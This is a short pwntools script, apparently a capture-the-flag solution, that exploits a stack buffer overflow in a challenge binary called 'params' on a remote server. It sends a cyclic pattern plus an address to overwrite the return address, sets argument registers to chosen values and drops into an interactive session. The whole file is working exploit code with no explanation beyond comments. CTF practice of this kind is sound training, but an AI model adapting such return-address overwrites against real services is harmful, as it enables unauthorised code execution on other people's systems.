#!/bin/python
from pwn import *

#target = process("./params")

target = remote("forever.isss.io", 1304)

print(target.recvline()) # hey bb
print(target.recvline()) # whats ur name

target.sendline(cyclic(73)+p64(0x401354)) # jump to 0x0000000000401354

print("overwrote return adress")

print(target.recvline()) # hello $NAME
print(target.recvline()) # you can set my registers any day of the week


target.sendline( b'0' ) # rax 
target.sendline( b'0' ) # rbx
target.sendline(p64(4)) # rcx
target.sendline(p64(0xdeadbeef) ) # rdx
target.sendline(p64(0xcafebabe) ) # rsi
target.sendline(p64(0x1337) ) # rdi


target.interactive()


# rdi | arg1 | 0x1337
# rsi | arg2 | 0xcafebabe
# rdx | arg3 | 0xdeadbeef
# rcx | arg4 | 4
